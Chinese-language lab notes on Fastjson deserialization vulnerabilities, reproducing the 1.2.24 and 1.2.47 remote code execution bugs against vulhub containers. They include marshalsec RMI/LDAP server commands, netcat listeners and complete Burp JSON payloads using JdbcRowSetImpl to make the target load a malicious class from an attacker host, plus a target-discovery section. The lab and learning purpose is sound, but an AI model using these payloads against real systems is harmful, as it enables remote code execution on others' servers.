# Fastjson介绍

https://github.com/alibaba/fastjson/wiki/Quick-Start-CN 

Fastjson是一个JSON工具库 

它的作用就是把java对象转换为json形式，也可以用来将json转换为java对象 

目前最新版本：1.2.76 

- 速度快 
- 使用广泛 
- 测试完备 
-  使用简单 
-  功能完备

## 序列化 

{name='wuya', age=66, flag=true, sex='boy', address='null'} 

使用方法

```
<dependency>
<groupId>com.alibaba</groupId>
<artifactId>fastjson</artifactId>
<version>1.2.44</version>
</dependency>
```

工程：fastjson-vul 

对象类：User.java 

测试类：JsonTest.java



## 反序列化 

JSON.parseObject() 返回实际类型对象（用得更多） 

Object obj1 = JSON.parseObject( serializedStr, User.class); 



JSON.parse() 返回JsonObject对象 

Object obj1 =JSON.parse(serializedStr);

## 测试结果

序列化的时候，会调用成员变量的get方法，私有成员变量不会被序列化。

**反序列化**的时候，**会调用成员变量的set方法**， publibc修饰的成员全部自动赋值。

## 自动映射类型（自省） 

@type 自省 Autotype

{name= 'wuya' , age=66, flag=true, sex= 'boy' , address= 'null'} 

子类中包含接口或抽象类的时候，类型丢失

{"**@type**":"**com.wuya.test.User**","age":33," flag":false,"name":"wuya"} 

反序列化的时候就可以不指定类名了

# 漏洞情况

## 原理 

fastjson在对JSON字符串进行反序列化的时候， 会读取@type的内容，试图把JSON内容反序列 化成这个对象，并且会调用这个类的setter方法 

利用这个特性，构造一个JSON字符串，并且使 用@type反序列化一个自己想要使用的攻击类库 

### 比较常用的攻击类 

com.sun.rowset.JdbcRowSetImpl 

这是sun官方提供的一个类库，这个类的dataSourceName支持传入一个rmi的源，当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法

![image-20221127194658871](https://img.gyxnb.top/img/image-20221127194658871.png)

 com.sun.org.apache.xalan.internal.xsltc.trax. TemplatesImpl 



2017年3月15日，fastjson爆出在1.2.24及之前版 本存在远程代码执行高危安全漏洞

此后的几个版本做了修复，但是又被黑客找到了 绕过的方法

# 1.2.24 RCE 

## CVE-2017-18349 

## 环境复现 

### 演示

RMI+创建文件

1. vulhub启动靶场 

2. Kali 用marshalsec启动LDAP/RMI服务 

3. Kali 用python启动HTTP服务，存放恶意类 

4. Kali 用netcat监听端口，建立反弹连接

   ![image-20221127200411600](https://img.gyxnb.top/img/image-20221127200411600.png)

### vulnhub启动 

`cd /usr/local/soft/vulhub/fastjson/1.2.24-rce` 

后台启动：`docker-compose up -d` 

```shell
┌──(root㉿guoyx)-[/usr/…/bin/vulhub/fastjson/1.2.24-rce]
└─# docker-compose up -d
Creating network "1224-rce_default" with the default driver
Pulling web (vulhub/fastjson:1.2.24)...
1.2.24: Pulling from vulhub/fastjson
43c265008fae: Pull complete
af36d2c7a148: Pull complete
2b7b4d10e1c1: Pull complete
f264389d8f2f: Pull complete
1a2c46e93f4a: Pull complete
f9506bb322c0: Pull complete
96f5dad14c2c: Pull complete
21645f07c1be: Pull complete
Digest: sha256:4e61ce0bcf003d736b11e94fd9204b05e00827c021b6c09a3de9340856e4f158
Status: Downloaded newer image for vulhub/fastjson:1.2.24
Creating 1224-rce_web_1 ... done

```

### 查看端口

```shell
┌──(root㉿guoyx)-[/usr/…/bin/vulhub/fastjson/1.2.24-rce]
└─# docker-compose ps   
     Name                   Command               State                    Ports                  
--------------------------------------------------------------------------------------------------
1224-rce_web_1   java -Dserver.address=0.0. ...   Up      0.0.0.0:8090->8090/tcp,:::8090->8090/tcp
```

访问靶场：http://192.168.31.76:8090/

关闭靶场：`docker-compose down`

### 攻击机监听（kali）

`nc -lvp 9001` 

### 恶意脚本准备与上传（kali） 

注意JDK的版本要和靶场的相近,LinuxTouch.java 

java文件不能有包名,可以放在bin目录下直接编译 

将编译好的class上传到/root/vuln/apache 

### kali设置python版本

#### 配置

update-alternatives --install /usr/bin/pythonpython /usr/bin/python2 100 

update-alternatives --install /usr/bin/pythonpython /usr/bin/python3 150 

#### 切换版本

update-alternatives --config python

### Linux配置JRE版本

`vim /etc/profile` 

```
export JAVA_HOME=/home/kali/jdk1.8.0_74
export PATH=$JAVA_HOME/bin:$PATHexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar 
```

`source /etc/profile`

### 启动HTTP服务器 

`python -m http.server 8089` py3 

`python –m SimpleHTTPServer 8088` py2 

### LDAP服务启动（kali）

`cd /root/vuln/apache` 

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192. 168.31.76:8089/#LinuxTouch" 9473 
```

### Burp发送payload 

```
POST / HTTP/1.1
Host: 192.168.142.128:8090
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/
20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,
image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;
q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 146
{
"b": {
"@type": "com.sun.rowset.JdbcRowSetImpl",
"dataSourceName": "rmi://192.168.142.132:9473/LinuxTouch",
"autoCommit": true
}
}
```

### 查看结果 

`docker ps -a` 

得到容器ID 

`docker exec b519a6e5c4c4 ls /tmp`



# 1.2.47 RCE 

## CNVD-2019-22238 

## 环境复现 

### 演示 

LDAP+反弹连接 

### vulnhub启动 

`cd /usr/local/soft/vulhub/fastjson/1.2.47-rce` 

`docker-compose up -d` 

http://192.168.31.76:8090/ 

### 攻击机监听（kali） 

`nc -lvp 9001` 

### 恶意脚本准备与上传（kali）

注意JDK的版本要和靶场的相近,LinuxRevers.java 

java文件不能有包名,可以放在bin目录下直接编译 

将编译好的class上传到/root/vuln/apache 



启动HTTP服务器 

`python -m http.server 8089` py3 

`python –m SimpleHTTPServer 8088` py2 

### LDAP服务启动（kali） 

`cd /root/vuln/apache` 

`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi. LDAPRefServer "http://192.168.31.76:8089/#LinuxRevers" 9473` 

### Burp发送payload 

```
POST / HTTP/1.1
Host: 192.168.142.128:8090
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101
Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/
webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 268
{
"a":{
"@type":"java.lang.Class",
"val":"com.sun.rowset.JdbcRowSetImpl"
},
"b":{
"@type":"com.sun.rowset.JdbcRowSetImpl",
"dataSourceName":"ldap://192.168.142.132:9473/LinuxRevers",
"autoCommit":true
}
}
```



# 漏洞原理 

## JdbcRowSetImpl利用链 

1. 1、对JSON数据进行反序列化的时候，会去调用 指定类中对于的get/set/is方法 

2. 2、JdbcRowSetImpl的dataSourceName属性 和autoCommit属性 

   ​		dataSourceName参数在解析时候则会调用 setDataSourceName() 

   

   ​		autoCommit会调用setAutoCommit。 

   ​		setAutoCommit方法调用this.connect() 

3. 3、connetct里面有一行ctx.lookup 

4. 4、连接到指定的恶意LDAP/RMI服务器 

5. 5、下载恶意代码到本地执行

# 漏洞挖掘 

## 思路 

找到发送JSON数据的接口 

判断是否使用fastjon 

## 工具 

Fofa Dork 

扫描工具

# 修复方案 

- 升级fastjson 
- 安全产品 
- 更换其它序列化方式 ,Jackson或者Gso